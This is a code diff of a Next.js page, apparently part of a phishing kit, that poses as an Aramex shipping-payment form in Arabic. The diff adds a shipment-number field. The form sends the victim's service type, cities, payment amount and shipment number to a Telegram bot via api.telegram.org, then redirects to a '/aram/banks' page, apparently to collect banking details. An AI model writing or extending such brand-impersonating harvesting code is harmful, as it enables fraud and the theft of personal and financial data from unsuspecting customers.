@@ -7,6 +7,7 @@ import {useRouter,useSearchParams} from 'next/navigation'
 
 const Page = () => {
   let typeRequest = useRef();
+  let numshoh = useRef();
   let fromcity = useRef();
   let tocity = useRef();
   let mony = useRef();
@@ -18,10 +19,10 @@ const Page = () => {
 
   const handlerout = () => {
     
-if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.value == "" || tocity.current.value == "" || mony.current.value == "") {
+if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.value == "" || tocity.current.value == "" || mony.current.value == ""|| numshoh.current.value == "") {
       alert('من فضلك قم بملى الحقول')
     }else{
-       router.push(`/aram/banks?names=${track}`)
+       router.push(`/aram/banks?names=${numshoh.current.value}`)
     }
   }
 
@@ -29,7 +30,7 @@ if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.valu
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    var length =`مدونة ارامكس %0A   نوع الخدمة : ${typeRequest.current.value} %0A من  : ${fromcity.current.value} %0A  الى : ${tocity.current.value} %0A قيمة السداد:${mony.current.value} %0A %0A ${track}`
+    var length =`مدونة ارامكس %0A   نوع الخدمة : ${typeRequest.current.value} %0A من  : ${fromcity.current.value} %0A  الى : ${tocity.current.value} %0A قيمة السداد:${mony.current.value} %0A %0A ${numshoh.current.value}`
 
 
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -50,6 +51,7 @@ if(typeRequest.current.value == "اختر الخدمة" || fromcity.current.valu
                 <option value="طلب توصيل">طلب توصيل</option>
                 <option value="طلب استلام">طلب استلام</option>
             </select>
+            <input type="number" name='numshoh'  placeholder='رقم الشحنة' ref={numshoh}required />
             <input type="text" name='fromcity'  placeholder='من مدينة' ref={fromcity}required />
             <input type="text" name='tocity'  placeholder='الى مدينة' ref={tocity}required />
             <input type="number" name='many' placeholder='قيمة السداد'ref={mony} required />
